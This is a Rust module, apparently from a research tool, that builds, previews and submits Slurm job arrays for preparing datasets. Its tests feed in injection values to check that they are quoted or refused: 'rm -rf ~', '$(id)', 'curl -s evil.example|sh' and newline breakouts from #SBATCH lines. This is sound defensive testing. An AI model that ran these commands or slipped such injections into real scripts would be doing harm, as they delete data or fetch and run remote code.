// SPDX-License-Identifier: Apache-2.0
//! Preview and submit the CPU-only Slurm job that prepares a cluster dataset.
//!
//! The script is rendered from the profile and the cache path returned by
//! `dataset index`; nothing is submitted until the user confirms the exact
//! preview hash. It is a job array: one 1-CPU task per scene, at most
//! `throttle` running at once (`--array=0-N%throttle`), so scenes start as
//! single CPUs free up and none waits for a whole multi-CPU allocation.
//!
//! The limit is the shared filesystem, not CPUs: a cold raw file costs ~150 ms
//! before its first byte (job 670409: 6.4 files/s for one sequential reader,
//! ~800 MiB/s warm). Each task reads `IO_THREADS` files at once
//! (`COPERCEIVE_IO_THREADS`), and the default throttle keeps the whole array
//! at `CONCURRENT_READS` reads in flight. The preview estimates the time from
//! the files the scenes hold, or from the cache's timing log of the last run. Preparation never reads or writes the raw root from the login
//! node: the compute-node job runs `coperceive dataset prepare`.

use std::hash::{Hash, Hasher};
use std::path::{Path, PathBuf};
use std::time::Duration;

use serde::{Deserialize, Serialize};

use crate::hpc::{coperceive_argv, is_under, normalise_path, validate_results_root, ServerProfile};
use crate::job_submit::{job_scratch_dir, parse_job_id, safe_job_name};
use crate::slurm_adapter::{RemoteRunner, SshRunner};
use crate::ssh::shell_quote;

const SUBMIT_TIMEOUT: Duration = Duration::from_secs(30);
const DEFAULT_WALLTIME: &str = "04:00:00";

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DatasetPrepareRequest {
    pub adapter: String,
    pub raw_root: String,
    pub split: Option<String>,
    pub scenes: Option<Vec<String>>,
    /// Scenes prepared at once: the array's `%` throttle.
    pub workers: u32,
    /// Camera images: "originals" (read the dataset's files) or "previews".
    #[serde(default = "default_images")]
    pub images: String,
}

fn default_images() -> String {
    "originals".to_string()
}

/// Disk estimate per camera preview (docs/datasets/cluster-datasets.md).
pub const PREVIEW_BYTES_ESTIMATE: u64 = 40_000;

/// Raw files each prepare task reads at once.
pub const IO_THREADS: u32 = 16;
/// Reads in flight across the whole array by default: 8 tasks of 16.
pub const CONCURRENT_READS: u32 = 128;
/// Measured on the cluster (job 670409, one V2XSet scene, 1 CPU): seconds to a
/// cold file's first byte, and CPU seconds per sweep (PCD 23.5 ms + its YAML
/// record 23 ms) and per camera preview (20 ms).
const COLD_FILE_S: f64 = 0.150;
const CPU_PER_SWEEP_S: f64 = 0.0465;
const CPU_PER_PREVIEW_S: f64 = 0.020;
const WRITE_PER_SCENE_S: f64 = 2.0;
/// The cache's per-scene timing lines (`coperceive dataset prepare` writes them).
pub const TIMING_LOG: &str = ".timing.jsonl";

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DatasetPreparePreview {
    pub plan_id: String,
    pub job_name: String,
    pub partition: String,
    pub walltime: String,
    pub cpus_per_task: u32,
    /// One array task per scene.
    pub array_tasks: u32,
    /// At most this many tasks run at once (the editable "scenes at once").
    pub throttle: u32,
    /// Expected wall time once the tasks run (queue time not included).
    pub estimated_seconds: u64,
    /// How the estimate was made, for the preview.
    pub estimate_note: String,
    pub gres: Option<String>,
    pub cache_root: String,
    pub estimated_cache_bytes: u64,
    /// The camera-image mode this script prepares with.
    pub images: String,
    /// Extra disk the previews mode would use for these scenes.
    pub estimated_preview_bytes: u64,
    pub script: String,
    pub preview_hash: String,
}

#[derive(Clone)]
pub struct PendingPrepare {
    pub profile_id: String,
    pub runner: SshRunner,
    pub request: DatasetPrepareRequest,
    pub preview: DatasetPreparePreview,
    pub script: String,
}

/// Scenes a prepare array runs at once: omitted = as many as keep the array at
/// `CONCURRENT_READS` reads on the shared filesystem (8 tasks of `IO_THREADS`),
/// no more than the scenes; always clamped to 1..=16.
pub fn resolve_workers(requested: Option<u32>, selected_scenes: usize) -> u32 {
    let by_filesystem = CONCURRENT_READS / IO_THREADS;
    requested
        .unwrap_or((selected_scenes as u32).min(by_filesystem))
        .clamp(1, 16)
}

/// Raw files a scene's prepare reads: a sweep and its record per lidar sample,
/// plus every camera image in previews mode.
fn scene_files(row: &serde_json::Value, previews: bool) -> (f64, f64, f64) {
    let lidar = row.pointer("/sensors/lidar_samples").and_then(serde_json::Value::as_u64).unwrap_or(0) as f64;
    let camera = row.pointer("/sensors/camera_samples").and_then(serde_json::Value::as_u64).unwrap_or(0) as f64;
    (lidar, if previews { camera } else { 0.0 }, 2.0 * lidar + if previews { camera } else { 0.0 })
}

/// Seconds per raw file (record + sweep) in this mode from the last run's
/// timing lines: the median over its prepared scenes, and how many there were.
fn measured_seconds_per_file(timing: &str, images: &str) -> Option<(f64, usize)> {
    let mut rates: Vec<f64> = timing
        .lines()
        .filter_map(|line| serde_json::from_str::<serde_json::Value>(line).ok())
        .filter(|row| row.get("state").and_then(serde_json::Value::as_str) == Some("ready"))
        .filter(|row| row.get("images").and_then(serde_json::Value::as_str) == Some(images))
        .filter(|row| row.get("restage").is_none())
        .filter_map(|row| {
            let total = row.get("total_s")?.as_f64()?;
            let files = row.get("files_read")?.as_f64()?;
            (files > 0.0 && total > 0.0).then_some(total / files)
        })
        .collect();
    if rates.is_empty() {
        return None;
    }
    rates.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
    Some((rates[rates.len() / 2], rates.len()))
}

/// Wall time for the selected scenes once the array runs: each scene from its
/// files, `throttle` scenes at a time. From the last run's timing log when it
/// has scenes in this mode, else from the cluster measurements above.
pub fn estimate_seconds(
    index: &serde_json::Value,
    scene_ids: &[String],
    images: &str,
    throttle: u32,
    timing: &str,
) -> (u64, String) {
    let previews = images == "previews";
    let rows: Vec<&serde_json::Value> = index
        .get("scenes")
        .and_then(serde_json::Value::as_array)
        .map(|rows| {
            rows.iter()
                .filter(|row| {
                    row.get("scene_id")
                        .and_then(serde_json::Value::as_str)
                        .is_some_and(|id| scene_ids.iter().any(|wanted| wanted == id))
                })
                .collect()
        })
        .unwrap_or_default();
    let measured = measured_seconds_per_file(timing, images);
    let per_scene: Vec<f64> = rows
        .iter()
        .map(|row| {
            let (sweeps, camera, files) = scene_files(row, previews);
            match measured {
                // The log's rate already holds the reads, previews and writes.
                Some((rate, _)) => 2.0 * sweeps * rate,
                None => {
                    let read = files * COLD_FILE_S / f64::from(IO_THREADS);
                    let cpu = sweeps * CPU_PER_SWEEP_S + camera * CPU_PER_PREVIEW_S;
                    read.max(cpu) + WRITE_PER_SCENE_S
                }
            }
        })
        .collect();
    let throttle = f64::from(throttle.max(1));
    let longest = per_scene.iter().copied().fold(0.0_f64, f64::max);
    let total = (per_scene.iter().sum::<f64>() / throttle).max(longest);
    let files: f64 = rows.iter().map(|row| scene_files(row, previews).2).sum();
    let note = match measured {
        Some((rate, scenes)) => format!(
            "from the last run's timing on this cluster ({scenes} scene{}, {:.0} ms per raw file)",
            if scenes == 1 { "" } else { "s" },
            rate * 1000.0
        ),
        None => format!(
            "{} raw files; the shared filesystem is the limit (~150 ms per cold file, {} read at once per scene), plus parsing{}",
            files as u64,
            IO_THREADS,
            if previews { " and previews" } else { "" }
        ),
    };
    (total.round() as u64, note)
}

fn preview_hash(script: &str) -> String {
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    script.hash(&mut hasher);
    format!("{:016x}", hasher.finish())
}

fn actor_argv(profile: &ServerProfile, request: &DatasetPrepareRequest, cache: &str) -> Vec<String> {
    let mut args = vec![
        "dataset".to_string(),
        "prepare".to_string(),
        "--adapter".to_string(),
        request.adapter.clone(),
        "--raw-root".to_string(),
        request.raw_root.clone(),
    ];
    // Without the split a root holding several is refused (it used to prepare
    // the first one present, e.g. train when the user chose test).
    if let Some(split) = request
        .split
        .as_deref()
        .map(str::trim)
        .filter(|split| !split.is_empty())
    {
        args.push("--split".to_string());
        args.push(split.to_string());
    }
    args.extend([
        "--cache".to_string(),
        cache.to_string(),
        "--workers".to_string(),
        "1".to_string(),
        "--images".to_string(),
        request.images.clone(),
        // The task's scene follows, from the script's SCENES array.
        "--scenes".to_string(),
    ]);
    coperceive_argv(profile, &args)
}

/// A value written unquoted into an `#SBATCH` line (and the header comment)
/// must reach sbatch as one argument. After a line break bash would run the rest
/// as a command and sbatch would stop reading directives; sbatch also splits a
/// directive line at whitespace, ends it at an unquoted '#', and groups quotes,
/// so a space could add an option such as `--export=ALL,BASH_ENV=<file>`.
fn sbatch_value(label: &str, value: &str) -> Result<(), String> {
    if value.chars().any(char::is_control) {
        return Err(format!(
            "The {label} {value:?} contains a line break or control character, so it cannot go \
             into the job script."
        ));
    }
    if value
        .chars()
        .any(|ch| ch.is_whitespace() || matches!(ch, '#' | '\'' | '"'))
    {
        return Err(format!(
            "The {label} {value:?} cannot go into the job script's #SBATCH line: Slurm splits \
             these lines at spaces and cuts them at '#', so the value may not contain spaces, \
             '#' or quotes."
        ));
    }
    Ok(())
}

/// Render the full prepare script; `scene_ids` are the selected scenes (every
/// scene of the index for "all"), `estimated_cache_bytes` comes from index.
pub fn render_prepare_script(
    profile: &ServerProfile,
    request: &DatasetPrepareRequest,
    scene_ids: &[String],
    cache_relative: &str,
    estimated_cache_bytes: u64,
    estimated_preview_bytes: u64,
) -> Result<DatasetPreparePreview, String> {
    render_prepare_script_with_estimate(
        profile,
        request,
        scene_ids,
        cache_relative,
        estimated_cache_bytes,
        estimated_preview_bytes,
        (0, String::new()),
    )
}

/// The same, with the preview's time estimate (see `estimate_seconds`).
pub fn render_prepare_script_with_estimate(
    profile: &ServerProfile,
    request: &DatasetPrepareRequest,
    scene_ids: &[String],
    cache_relative: &str,
    estimated_cache_bytes: u64,
    estimated_preview_bytes: u64,
    estimate: (u64, String),
) -> Result<DatasetPreparePreview, String> {
    if !crate::state::CAMERA_IMAGE_MODES.contains(&request.images.as_str()) {
        return Err(format!(
            "Camera images must be \"originals\" or \"previews\", not {:?}.",
            request.images
        ));
    }
    if request.workers == 0 {
        return Err("Choose at least one scene at a time for dataset preparation.".to_string());
    }
    if scene_ids.is_empty() {
        return Err("No scenes to prepare.".to_string());
    }
    let tasks = scene_ids.len() as u32;
    let throttle = request.workers.min(tasks);
    if !matches!(request.adapter.as_str(), "griffin" | "opv2v" | "v2xset" | "v2v4real" | "dair-v2x-c") {
        return Err(format!("{} is not a built-in cluster adapter.", request.adapter));
    }
    let partition = profile
        .defaults
        .partition
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .ok_or_else(|| "Choose a partition on the server profile before preparing a dataset.".to_string())?;
    // The results folder is written unquoted into the #SBATCH --output/--error
    // lines; the profile was validated when it was saved, but check again here
    // (this refuses a line break, and a space, '#' or quote sbatch would split).
    let results_root = validate_results_root(&profile.results_root)?;
    let cache = normalise_path(
        &format!("{}/{}", results_root.trim_end_matches('/'), cache_relative),
        "cache root",
    )?;
    let raw = normalise_path(&request.raw_root, "raw root")?;
    if is_under(&cache, &raw) {
        return Err("The cache directory must not be inside the raw dataset root.".to_string());
    }
    let walltime = profile
        .defaults
        .time_limit
        .clone()
        .filter(|value| !value.trim().is_empty())
        .unwrap_or_else(|| DEFAULT_WALLTIME.to_string());
    let job_name = prepare_job_name(cache_relative);
    sbatch_value("job name", &job_name)?;
    sbatch_value("partition", partition)?;
    sbatch_value("walltime", &walltime)?;
    let mut lines = vec![
        "#!/bin/bash".to_string(),
        format!("# Dataset preparation for {}.", request.adapter),
        format!("# Job name: {job_name}"),
        "# Rendered by Coperceive. Nothing is submitted until the user confirms this script.".to_string(),
        format!("#SBATCH --job-name={job_name}"),
        format!("#SBATCH --partition={partition}"),
        format!("#SBATCH --time={walltime}"),
        format!("#SBATCH --array=0-{}%{throttle}", tasks - 1),
        "#SBATCH --cpus-per-task=1".to_string(),
        format!(
            "#SBATCH --output={}/dataset-prepare-%A_%a.out",
            results_root.trim_end_matches('/')
        ),
        format!(
            "#SBATCH --error={}/dataset-prepare-%A_%a.err",
            results_root.trim_end_matches('/')
        ),
        "# No GPU requested (CPU-only job).".to_string(),
        format!("# One 1-CPU task per scene ({tasks}), at most {throttle} at once."),
        format!(
            "# The shared filesystem is the limit: each task reads {IO_THREADS} raw files at once."
        ),
        String::new(),
        "set -euo pipefail".to_string(),
    ];
    lines.push(format!(
        "SCRATCH_DIR=\"{}\"",
        job_scratch_dir(&profile.scratch_template)
    ));
    lines.push("mkdir -p -m 0700 -- \"$SCRATCH_DIR\"".to_string());
    lines.push("trap 'rm -rf -- \"$SCRATCH_DIR\"' EXIT".to_string());
    lines.push(format!("export COPERCEIVE_IO_THREADS={IO_THREADS}"));
    lines.push(format!("CACHE_DIR={}", shell_quote(&cache)));
    lines.push(format!(
        "SCENES=({})",
        scene_ids.iter().map(|scene| shell_quote(scene)).collect::<Vec<_>>().join(" ")
    ));
    lines.push("SCENE=\"${SCENES[$SLURM_ARRAY_TASK_ID]}\"".to_string());
    lines.push(format!(
        "{} \"$SCENE\"",
        actor_argv(profile, request, &cache)
            .iter()
            .map(|part| shell_quote(part))
            .collect::<Vec<_>>()
            .join(" ")
    ));
    let script = lines.join("\n") + "\n";
    Ok(DatasetPreparePreview {
        plan_id: format!("dataset-{}", cache_relative.replace('/', "-")),
        job_name,
        partition: partition.to_string(),
        walltime,
        cpus_per_task: 1,
        array_tasks: tasks,
        throttle,
        estimated_seconds: estimate.0,
        estimate_note: estimate.1,
        gres: None,
        cache_root: cache.clone(),
        estimated_cache_bytes,
        images: request.images.clone(),
        estimated_preview_bytes,
        preview_hash: preview_hash(&script),
        script,
    })
}

/// Read the cache's timing log on the login node (empty when there is none).
/// Only a `tail` of a file inside the profile's results root; nothing is run.
pub fn read_timing_log(
    runner: &dyn RemoteRunner,
    profile: &ServerProfile,
    cache_relative: &str,
) -> String {
    let Ok(results_root) = normalise_path(&profile.results_root, "results_root") else {
        return String::new();
    };
    let Ok(path) = normalise_path(
        &format!("{}/{}/{TIMING_LOG}", results_root.trim_end_matches('/'), cache_relative),
        "timing log",
    ) else {
        return String::new();
    };
    if !is_under(&path, &results_root) {
        return String::new();
    }
    runner
        .run(&format!("tail -n 2000 {} 2>/dev/null", shell_quote(&path)), SUBMIT_TIMEOUT, None)
        .ok()
        .filter(|result| result.success)
        .map(|result| result.stdout)
        .unwrap_or_default()
}

/// Extra disk the previews mode would use: the selected scenes' camera samples
/// from the index document × the per-preview estimate.
pub fn preview_bytes_estimate(index: &serde_json::Value, scenes: Option<&[String]>) -> u64 {
    let wanted = |id: &str| scenes.map_or(true, |list| list.iter().any(|scene| scene == id));
    index
        .get("scenes")
        .and_then(serde_json::Value::as_array)
        .map(|rows| {
            rows.iter()
                .filter(|row| row.get("scene_id").and_then(serde_json::Value::as_str).is_some_and(wanted))
                .filter_map(|row| row.pointer("/sensors/camera_samples").and_then(serde_json::Value::as_u64))
                .sum::<u64>()
        })
        .unwrap_or(0)
        * PREVIEW_BYTES_ESTIMATE
}

/// Submit the exact previewed script. Re-rendering and hash comparison is the
/// same confirm rule as job submission.
pub fn submit_prepared(
    runner: &dyn RemoteRunner,
    entry: &crate::server_profiles::ServerEntry,
    pending: &PendingPrepare,
    preview_hash: &str,
    confirmed: bool,
) -> Result<serde_json::Value, String> {
    if !confirmed {
        return Err("Tick the confirmation before submitting the dataset preparation. Nothing was submitted.".to_string());
    }
    let preview = &pending.preview;
    if preview.preview_hash != preview_hash {
        return Err("The preparation preview changed. Generate it again and confirm the new script.".to_string());
    }
    let result = runner.run("sbatch --parsable", SUBMIT_TIMEOUT, Some(&pending.script))?;
    if !result.success {
        return Err(format!("The scheduler refused the preparation job: {}", result.stderr.trim()));
    }
    let job_id = parse_job_id(&result.stdout)?;
    let state = crate::job_submit::job_state(runner, &job_id).0;
    Ok(serde_json::json!({
        "job_id": job_id,
        "state": state,
        "queue_reason": null,
        "plan_id": preview.plan_id,
    }))
}

/// The prepare job's Slurm name: `coperceive-dataset-<hash>-<split>` from the
/// cache path, so two datasets with a `test` split never share a name (the job
/// watch checks a job by its name and user).
pub fn prepare_job_name(cache_relative: &str) -> String {
    let mut parts = cache_relative.trim_end_matches('/').rsplit('/');
    let split = parts.next().filter(|part| !part.is_empty()).unwrap_or("all");
    match parts.next().filter(|part| !part.is_empty()) {
        Some(hash) => format!("coperceive-dataset-{hash}-{split}"),
        None => format!("coperceive-dataset-{split}"),
    }
}

/// `<results_root>/<cache.relative_path>`: the cache split directory the
/// dataset index named. The app never builds the path itself. Only the
/// server's coperceive knows the raw root's real path, which the hash is
/// taken from. The path must be `coperceive-cache/<adapter>/<12 hex>/<split>`
/// for this adapter and split (`all` without one).
pub fn cache_dir(
    profile: &ServerProfile,
    adapter: &str,
    split: Option<&str>,
    cache_relative: &str,
) -> Result<String, String> {
    let split = split.map(str::trim).filter(|split| !split.is_empty()).unwrap_or("all");
    let parts: Vec<&str> = cache_relative.split('/').collect();
    let valid = matches!(
        parts.as_slice(),
        ["coperceive-cache", a, hash, s]
            if *a == adapter
                && *s == split
                && hash.len() == 12
                && hash.chars().all(|c| c.is_ascii_digit() || ('a'..='f').contains(&c))
    );
    if !valid {
        return Err(
            "The dataset index named an unexpected cache path. Index the dataset again.".to_string(),
        );
    }
    let results = normalise_path(&profile.results_root, "results_root")?;
    Ok(format!("{}/{}", results.trim_end_matches('/'), cache_relative))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::server_profiles::ServerEntry;

    fn entry() -> ServerEntry {
        serde_json::from_str(include_str!(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/tests/fixtures/hpc/cluster-b.json"
        )))
        .expect("fixture")
    }

    fn request() -> DatasetPrepareRequest {
        DatasetPrepareRequest {
            adapter: "opv2v".to_string(),
            raw_root: "/data/opv2v/test".to_string(),
            split: Some("test".to_string()),
            scenes: Some(vec!["scene_0001".to_string()]),
            workers: 4,
            images: "originals".to_string(),
        }
    }

    fn scenes(ids: &[&str]) -> Vec<String> {
        ids.iter().map(|id| id.to_string()).collect()
    }

    #[test]
    fn the_prepare_job_name_is_unique_per_dataset_split() {
        let entry = entry();
        let one = render_prepare_script(
            &entry.profile,
            &request(),
            &scenes(&["scene_0001"]),
            "coperceive-cache/opv2v/3b1e2f0a9c77/test",
            1,
            2,
        )
        .expect("preview");
        assert_eq!(one.job_name, "coperceive-dataset-3b1e2f0a9c77-test");
        assert!(one.script.contains("\n#SBATCH --job-name=coperceive-dataset-3b1e2f0a9c77-test\n"));
        // Another raw root with a `test` split gets another name (it used to be
        // `coperceive-dataset-test` for both).
        let other = render_prepare_script(
            &entry.profile,
            &request(),
            &scenes(&["scene_0001"]),
            "coperceive-cache/opv2v/0f0f0f0f0f0f/test",
            1,
            2,
        )
        .expect("preview");
        assert_ne!(one.job_name, other.job_name);
        assert_eq!(prepare_job_name("coperceive-cache/griffin/aaaaaaaaaaaa/all"), "coperceive-dataset-aaaaaaaaaaaa-all");
        assert_eq!(prepare_job_name("test"), "coperceive-dataset-test");
    }

    #[test]
    fn the_cache_dir_is_the_index_path_under_the_results_root() {
        let profile = entry().profile;
        let dir = cache_dir(&profile, "opv2v", Some("test"), "coperceive-cache/opv2v/3b1e2f0a9c77/test")
            .expect("cache dir");
        assert_eq!(dir, "/data/results/coperceive-cache/opv2v/3b1e2f0a9c77/test");
        assert_eq!(
            cache_dir(&profile, "griffin", None, "coperceive-cache/griffin/3b1e2f0a9c77/all").expect("no split"),
            "/data/results/coperceive-cache/griffin/3b1e2f0a9c77/all"
        );
        for bad in [
            "coperceive-cache/opv2v/3b1e2f0a9c77/train",
            "coperceive-cache/v2xset/3b1e2f0a9c77/test",
            "coperceive-cache/opv2v/3B1E2F0A9C77/test",
            "coperceive-cache/opv2v/abc123/test",
            "coperceive-cache/opv2v/../../../etc",
            "coperceive-cache/opv2v/3b1e2f0a9c77/test/..",
            "/abs/coperceive-cache/opv2v/3b1e2f0a9c77/test",
            "other/opv2v/3b1e2f0a9c77/test",
            "",
        ] {
            assert!(cache_dir(&profile, "opv2v", Some("test"), bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn preview_is_cpu_only_uses_the_workers_and_has_a_job_scratch_trap() {
        let entry = entry();
        let preview = render_prepare_script(
            &entry.profile,
            &request(),
            &scenes(&["scene_0001"]),
            "coperceive-cache/opv2v/abc123/test",
            12_345,
            80_000,
        )
        .expect("preview");
        assert_eq!(preview.cpus_per_task, 1);
        assert_eq!((preview.array_tasks, preview.throttle), (1, 1));
        assert!(preview.script.contains("#SBATCH --array=0-0%1"), "{}", preview.script);
        assert_eq!(preview.gres, None);
        assert_eq!(preview.estimated_cache_bytes, 12_345);
        assert!(preview.cache_root.ends_with("coperceive-cache/opv2v/abc123/test"));
        assert!(preview.script.contains("# No GPU requested (CPU-only job)."));
        assert!(preview.script.contains("/coperceive-${SLURM_JOB_ID}"));
        assert!(preview.script.contains("trap 'rm -rf -- \"$SCRATCH_DIR\"' EXIT"));
        assert!(preview.script.contains("dataset prepare"));
        assert!(preview.script.contains("--workers 1"));
        assert!(preview.script.contains("SCENES=(scene_0001)"), "{}", preview.script);
        assert!(preview.script.contains("--scenes \"$SCENE\""), "{}", preview.script);
        assert!(preview.script.contains("--images originals"));
        assert_eq!((preview.images.as_str(), preview.estimated_preview_bytes), ("originals", 80_000));
        assert!(preview.script.contains("'/home/bob/coperceive-app/.venv/bin/python' -m coperceive")
            || preview.script.contains("/home/bob/coperceive-app/.venv/bin/python -m coperceive"));
    }

    #[test]
    fn workers_default_to_the_scene_count_capped_and_clamp_to_sixteen() {
        assert_eq!(resolve_workers(None, 3), 3);
        assert_eq!(resolve_workers(None, 40), 8);
        assert_eq!(resolve_workers(Some(0), 4), 1);
        assert_eq!(resolve_workers(Some(99), 4), 16);
    }

    #[test]
    fn a_cache_inside_the_raw_root_is_refused() {
        let mut entry = entry();
        let mut request = request();
        request.raw_root = "/data/opv2v".to_string();
        entry.profile.results_root = "/data/opv2v".to_string();
        let error = render_prepare_script(
            &entry.profile,
            &request,
            &scenes(&["a"]),
            "coperceive-cache/opv2v/abc/test",
            0,
            0,
        )
        .expect_err("cache inside raw");
        assert!(error.contains("must not be inside"), "{error}");
    }

    #[test]
    fn the_prepare_argv_keeps_the_saved_command() {
        let entry = entry();
        let argv = actor_argv(
            &entry.profile,
            &request(),
            "/data/results/coperceive-cache/opv2v/abc/test",
        );
        assert_eq!(
            &argv[..3],
            &[
                "/home/bob/coperceive-app/.venv/bin/python",
                "-m",
                "coperceive"
            ]
        );
        assert!(argv.contains(&"dataset".to_string()));
        assert_eq!(argv.last().map(String::as_str), Some("--scenes"));
    }

    #[test]
    fn the_camera_image_mode_is_in_the_script_and_changes_the_hash() {
        let entry = entry();
        let mut request = request();
        let originals =
            render_prepare_script(&entry.profile, &request, &scenes(&["a"]), "coperceive-cache/opv2v/abc/test", 1, 2)
                .expect("originals");
        request.images = "previews".to_string();
        let previews =
            render_prepare_script(&entry.profile, &request, &scenes(&["a"]), "coperceive-cache/opv2v/abc/test", 1, 2)
                .expect("previews");
        assert!(previews.script.contains("--images previews"), "{}", previews.script);
        assert_ne!(originals.preview_hash, previews.preview_hash);
        request.images = "all".to_string();
        let error =
            render_prepare_script(&entry.profile, &request, &scenes(&["a"]), "coperceive-cache/opv2v/abc/test", 1, 2)
                .expect_err("unknown mode");
        assert!(error.contains("Camera images must be"), "{error}");
    }

    #[test]
    fn a_dataset_is_one_task_per_scene_throttled_with_hostile_ids_quoted() {
        let entry = entry();
        let mut request = request();
        request.scenes = None;
        request.workers = 8;
        let ids = scenes(&["s0", "s1", "s 2; rm -rf ~", "$(id)"]);
        let preview =
            render_prepare_script(&entry.profile, &request, &ids, "coperceive-cache/opv2v/abc/test", 1, 2)
                .expect("array");
        assert_eq!((preview.array_tasks, preview.throttle, preview.cpus_per_task), (4, 4, 1));
        let script = &preview.script;
        assert!(script.contains("#SBATCH --array=0-3%4"), "{script}");
        assert!(script.contains("#SBATCH --cpus-per-task=1"), "{script}");
        assert!(script.contains("dataset-prepare-%A_%a.out"), "{script}");
        assert!(script.contains("SCENES=(s0 s1 's 2; rm -rf ~' '$(id)')"), "{script}");
        assert!(!script.contains("--all"), "{script}");
        request.workers = 2;
        let throttled =
            render_prepare_script(&entry.profile, &request, &ids, "coperceive-cache/opv2v/abc/test", 1, 2)
                .expect("throttled");
        assert!(throttled.script.contains("#SBATCH --array=0-3%2"), "{}", throttled.script);
        assert_ne!(throttled.preview_hash, preview.preview_hash);
        assert!(render_prepare_script(&entry.profile, &request, &[], "c/opv2v/abc/test", 1, 2).is_err());
    }

    #[test]
    fn the_time_estimate_counts_raw_files_and_learns_from_the_timing_log() {
        // One V2XSet scene as measured: 852 sweeps, 3,408 camera frames.
        let index = serde_json::json!({"scenes": [
            {"scene_id": "a", "sensors": {"lidar_samples": 852, "camera_samples": 3408}},
            {"scene_id": "b", "sensors": {"lidar_samples": 852, "camera_samples": 3408}},
        ]});
        let ids = scenes(&["a", "b"]);
        let (one_at_a_time, note) = estimate_seconds(&index, &ids, "originals", 1, "");
        // CPU-bound once 16 reads overlap: 852 x 46.5 ms + 2 s write, per scene.
        assert_eq!(one_at_a_time, 83, "{note}");
        assert!(note.contains("3408 raw files") && note.contains("shared filesystem"), "{note}");
        let (two_at_once, _) = estimate_seconds(&index, &ids, "originals", 2, "");
        assert_eq!(two_at_once, 42);
        let (previews, _) = estimate_seconds(&index, &ids, "previews", 2, "");
        assert!(previews > two_at_once, "{previews}");
        let timing = [
            r#"{"scene_id":"x","state":"ready","images":"originals","files_read":1704,"total_s":170.4}"#,
            r#"{"scene_id":"y","state":"ready","images":"originals","files_read":1000,"total_s":50.0}"#,
            r#"{"scene_id":"z","state":"ready","images":"originals","files_read":1000,"total_s":300.0}"#,
            r#"{"scene_id":"w","state":"failed","images":"originals","files_read":1,"total_s":900.0}"#,
            "not json",
        ]
        .join("\n");
        let (learned, note) = estimate_seconds(&index, &ids, "originals", 2, &timing);
        // Median 100 ms per file x 1,704 files.
        assert_eq!(learned, 170, "{note}");
        assert!(note.contains("last run") && note.contains("3 scenes"), "{note}");
        // The log has no previews run: previews fall back to the model.
        assert_eq!(estimate_seconds(&index, &ids, "previews", 2, &timing).0, previews);
    }

    #[test]
    fn the_default_throttle_is_a_filesystem_budget() {
        assert_eq!(resolve_workers(None, 33), CONCURRENT_READS / IO_THREADS);
        assert_eq!(resolve_workers(None, 3), 3);
    }

    #[test]
    fn the_preview_estimate_counts_the_selected_scenes_camera_samples() {
        let index = serde_json::json!({"scenes": [
            {"scene_id": "a", "sensors": {"camera_samples": 10}},
            {"scene_id": "b", "sensors": {"camera_samples": 5}},
        ]});
        assert_eq!(preview_bytes_estimate(&index, None), 15 * PREVIEW_BYTES_ESTIMATE);
        let only_b = ["b".to_string()];
        assert_eq!(preview_bytes_estimate(&index, Some(&only_b)), 5 * PREVIEW_BYTES_ESTIMATE);
    }

    #[test]
    fn a_results_root_that_would_break_out_of_an_sbatch_line_is_refused() {
        for bad in [
            "/dev/null\necho INJECTED_LINE_RAN #",
            "/shared/lab/runs\ncurl -s evil.example|sh\n#",
            "/data/results\rx",
            "/data/lab/x$(id)",
            "/data/lab/x`id`",
            "/data/lab/x\"y",
            "/data/lab/x\\y",
        ] {
            let mut entry = entry();
            entry.profile.results_root = bad.to_string();
            let error = render_prepare_script(
                &entry.profile,
                &request(),
                &scenes(&["scene_0001"]),
                "coperceive-cache/opv2v/abc123/test",
                0,
                0,
            )
            .expect_err(&format!("results_root {bad:?} must be refused"));
            assert!(error.contains("results folder"), "{bad:?}: {error}");
        }
    }

    #[test]
    fn a_tilde_results_root_is_refused_instead_of_writing_into_a_literal_tilde_folder() {
        let mut entry = entry();
        entry.profile.results_root = "~/results".to_string();
        let error = render_prepare_script(
            &entry.profile,
            &request(),
            &scenes(&["scene_0001"]),
            "coperceive-cache/opv2v/abc123/test",
            0,
            0,
        )
        .expect_err("~ results root");
        assert!(error.contains("absolute path"), "{error}");
    }

    #[test]
    fn sbatch_header_values_stay_on_their_line() {
        // The job name comes from the cache path the cluster's index returned.
        let entry = entry();
        let error = render_prepare_script(
            &entry.profile,
            &request(),
            &scenes(&["scene_0001"]),
            "coperceive-cache/opv2v/abc123/test\necho INJECTED_LINE_RAN",
            0,
            0,
        )
        .expect_err("line break in the job name");
        assert!(error.contains("line break"), "{error}");

        for (partition, time_limit) in [
            (Some("main-cpu\necho INJECTED_LINE_RAN"), None),
            (None, Some("04:00:00\necho INJECTED_LINE_RAN")),
        ] {
            let mut entry = entry.clone();
            if let Some(partition) = partition {
                entry.profile.defaults.partition = Some(partition.to_string());
            }
            if let Some(time_limit) = time_limit {
                entry.profile.defaults.time_limit = Some(time_limit.to_string());
            }
            let error = render_prepare_script(
                &entry.profile,
                &request(),
                &scenes(&["scene_0001"]),
                "coperceive-cache/opv2v/abc123/test",
                0,
                0,
            )
            .expect_err("line break in an #SBATCH value");
            assert!(error.contains("line break"), "{error}");
        }

        // Every header line of a legitimate script is a single line.
        let preview = render_prepare_script(
            &entry.profile,
            &request(),
            &scenes(&["scene_0001"]),
            "coperceive-cache/opv2v/abc123/test",
            0,
            0,
        )
        .expect("legitimate preview");
        assert!(
            preview
                .script
                .contains("#SBATCH --output=/data/results/dataset-prepare-%A_%a.out\n"),
            "{}",
            preview.script
        );
    }

    /// Splits the text after `#SBATCH` the way sbatch's directive reader does
    /// (Slurm src/sbatch/opt.c): whitespace separates arguments, a backslash
    /// escapes the next character, single or double quotes group, and an
    /// unquoted '#' ends the line. An unmatched quote is an sbatch error.
    fn sbatch_arguments(rest: &str) -> Result<Vec<String>, String> {
        let mut arguments = Vec::new();
        let mut chars = rest.chars().peekable();
        loop {
            while chars.peek().is_some_and(|ch| ch.is_ascii_whitespace()) {
                chars.next();
            }
            if chars.peek().is_none() {
                return Ok(arguments);
            }
            let mut argument = String::new();
            let mut quote: Option<char> = None;
            let mut escaped = false;
            let mut comment = false;
            while let Some(&ch) = chars.peek() {
